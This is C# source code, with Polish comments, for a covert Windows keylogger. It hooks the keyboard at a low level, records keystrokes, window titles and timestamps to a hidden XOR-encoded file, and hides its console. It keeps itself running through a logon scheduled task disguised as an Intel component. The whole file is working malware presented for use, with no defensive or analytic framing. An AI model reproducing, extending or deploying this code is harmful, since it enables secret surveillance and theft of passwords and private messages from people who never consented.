using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using IWshRuntimeLibrary;
using System.Text;
using Microsoft.Win32.TaskScheduler;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static Stopwatch stopwatch = new Stopwatch();
    private const int IdleThreshold = 2000; // 2 sekundy
    private static string previousForegroundWindowName;

    [STAThread]
    public static void Main()
    {
        string dataDirPath = Application.StartupPath + @"\share";
        if (!Directory.Exists(dataDirPath))
        {
            Directory.CreateDirectory(dataDirPath);
            System.IO.File.SetAttributes(dataDirPath, System.IO.File.GetAttributes(dataDirPath) | FileAttributes.Hidden);
        }

        string filePath = dataDirPath + @"\data";
        if (!System.IO.File.Exists(filePath))
        {
            using (System.IO.File.Create(filePath)) { }
            System.IO.File.SetAttributes(filePath, System.IO.File.GetAttributes(filePath) | FileAttributes.Hidden);
        }

        string taskName = "Intel(R) Dynamic";
        string executableFileName = "Intel(R) Dynamic.exe";
        
        string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
        
        string executablePath = System.IO.Path.Combine(currentDirectory, executableFileName);
        
        if (!DoesTaskExist(taskName))
        {
            using (TaskService taskService = new TaskService())
            {
                TaskDefinition taskDefinition = taskService.NewTask();
        
                taskDefinition.Actions.Add(new ExecAction(executablePath));
                taskDefinition.Triggers.Add(new LogonTrigger());
                try
                {
                    taskService.RootFolder.RegisterTaskDefinition(taskName, taskDefinition);
                }
                catch
                {
                    // sraka
                }
            }
        }

        // jak user to CreateShortcut()

        var handle = GetConsoleWindow();

        ShowWindow(handle, 0);

        previousForegroundWindowName = "";

        _hookID = SetHook(_proc);
        stopwatch.Start();

        Application.Run();

        UnhookWindowsHookEx(_hookID);
    }

    static bool DoesTaskExist(string taskName)
    {
        using (TaskService taskService = new TaskService())
        {
            Task existingTask = taskService.GetTask(taskName);
    
            return existingTask != null;
        }
    }

    static void CreateShortcut()
    {
        string appName = "Intel(R) Dynamic";

        string autostartFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{appName}.lnk");

        if (!System.IO.File.Exists(autostartFolderPath))
        {
            string appPath = Assembly.GetEntryAssembly().Location;

            WshShell shell = new WshShell();

            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(autostartFolderPath);

            shortcut.TargetPath = appPath;

            shortcut.Save();
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static string CheckSymbols(Keys key)
    {
        bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
        switch (key)
        {
            case Keys.Left: return "|LEFT|";
            case Keys.Up: return "|UP|";
            case Keys.Right: return "|RIGHT|";
            case Keys.Down: return "|DOWN|";
            case Keys.Return: return "|RETURN|";
            case Keys.D1: return shiftKey ? "!" : "1";
            case Keys.D2: return shiftKey ? "@" : "2";
            case Keys.D3: return shiftKey ? "#" : "3";
            case Keys.D4: return shiftKey ? "$" : "4";
            case Keys.D5: return shiftKey ? "%" : "5";
            case Keys.D6: return shiftKey ? "^" : "6";
            case Keys.D7: return shiftKey ? "&" : "7";
            case Keys.D8: return shiftKey ? "*" : "8";
            case Keys.D9: return shiftKey ? "(" : "9";
            case Keys.D0: return shiftKey ? ")" : "0";
            case Keys.Oemtilde: return shiftKey ? "~" : "`";
            case Keys.OemMinus: return shiftKey ? "_" : "-";
            case Keys.Oemplus: return shiftKey ? "+" : "=";
            case Keys.OemOpenBrackets: return shiftKey ? "{" : "[";
            case Keys.OemCloseBrackets: return shiftKey ? "}" : "]";
            case Keys.OemSemicolon: return shiftKey ? ":" : ";";
            case Keys.OemQuotes: return shiftKey ? "\"" : "'";
            case Keys.OemPipe: return shiftKey ? "|" : "\\";
            case Keys.Oemcomma: return shiftKey ? "<" : ",";
            case Keys.OemPeriod: return shiftKey ? ">" : ".";
            case Keys.OemQuestion: return shiftKey ? "?" : "/";
            case Keys.Back: return "|BACK|"; // backspace
            case Keys.Space: return " ";
        }

        return "";
    }

    private static string Parse(int key, bool alt)
    {
        bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
        bool ctrlKey = (Control.ModifierKeys & Keys.Control) != 0;

        char keyChar = (char)key;

        string finalResult = CheckSymbols((Keys)key);
        // jesli nie jest symbolem
        if (finalResult.Length > 0)
            return finalResult;

        // litery
        if (char.IsLetter(keyChar))
        {
            // polska gurom
            if (alt)
            {
                switch (key)
                {
                    case (int)Keys.E: return shiftKey ? "Ę" : "ę";
                    case (int)Keys.L: return shiftKey ? "Ł" : "ł";
                    case (int)Keys.O: return shiftKey ? "Ó" : "ó";
                    case (int)Keys.A: return shiftKey ? "Ą" : "ą";
                    case (int)Keys.S: return shiftKey ? "Ś" : "ś";
                    case (int)Keys.Z: return shiftKey ? "Ż" : "ż";
                    case (int)Keys.X: return shiftKey ? "Ź" : "ź";
                    case (int)Keys.C: return shiftKey ? "Ć" : "ć";
                    case (int)Keys.N: return shiftKey ? "Ń" : "ń";
                }
            }

            char caseSensitiveChar = shiftKey ? char.ToUpper(keyChar) : char.ToLower(keyChar);

            finalResult = caseSensitiveChar.ToString();

            if (ctrlKey)
            {
                finalResult = " |CTRL+" + finalResult + "| ";
            }
        }

        return finalResult;
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)0x0104))
        {
            bool alt = false;
            if (wParam == (IntPtr)0x0104)
            {
                alt = true;
            }
            LogActiveWindowInfo();

            string dataDirPath = Application.StartupPath + @"\share";

            using (FileStream fs = new FileStream(dataDirPath + "\\data", FileMode.Append))
            using (BinaryWriter writer = new BinaryWriter(fs))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (stopwatch.ElapsedMilliseconds >= IdleThreshold)
                {
                    writer.Write(EncodeString("\n"));
                }

                byte[] encodedBytes = EncodeString(Parse(vkCode, alt));
                writer.Write(encodedBytes);

                stopwatch.Restart();
            }
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void LogActiveWindowInfo()
    {
        IntPtr currentForegroundWindowHandle = GetForegroundWindow();
        Process currentProcess = GetProcessFromWindowHandle(currentForegroundWindowHandle);
        string currentWindowName = currentProcess?.ProcessName;

        const int nChars = 256;
        string windowTitle = new string(' ', nChars);
        GetWindowText(currentForegroundWindowHandle, windowTitle, nChars);

        currentWindowName = currentWindowName + windowTitle.Trim();

        if (currentWindowName != previousForegroundWindowName)
        {
            string dataDirPath = Application.StartupPath + @"\share";
            using (FileStream fs = new FileStream(dataDirPath + @"\data", FileMode.Append))
            using (BinaryWriter writer = new BinaryWriter(fs))
            {

                DateTime currentDateAndTime = DateTime.Now;

                string date = $"[Time: {currentDateAndTime}]";
                string process = $"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]";

                writer.Write(EncodeString("\n"));
                writer.Write(EncodeString("\n"));
                writer.Write(EncodeString(date));
                writer.Write(EncodeString("\n"));
                writer.Write(EncodeString(process));
                writer.Write(EncodeString("\n"));
                writer.Write(EncodeString("\n"));

                previousForegroundWindowName = currentWindowName;
            }
        }
    }

    static byte[] EncodeString(string inputStr)
    {
        byte[] inputBytes = Encoding.UTF8.GetBytes(inputStr);
        byte[] encodedBytes = new byte[inputBytes.Length];

        for (int i = 0; i < inputBytes.Length; i++)
        {
            // XOR
            encodedBytes[i] = (byte)(inputBytes[i] ^ 0x3F);
        }

        return encodedBytes;
    }

    private static Process GetProcessFromWindowHandle(IntPtr windowHandle)
    {
        int processId;
        GetWindowThreadProcessId(windowHandle, out processId);

        try
        {
            return Process.GetProcessById(processId);
        }
        catch (ArgumentException)
        {
            // guwno?
            return null;
        }
    }

    [DllImport("user32.dll")]
    private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, string lpString, int nMaxCount);


    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetSystemTime(ref SYSTEMTIME st);

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEMTIME
    {
        public short wYear;
        public short wMonth;
        public short wDayOfWeek;
        public short wDay;
        public short wHour;
        public short wMinute;
        public short wSecond;
        public short wMilliseconds;
    }
}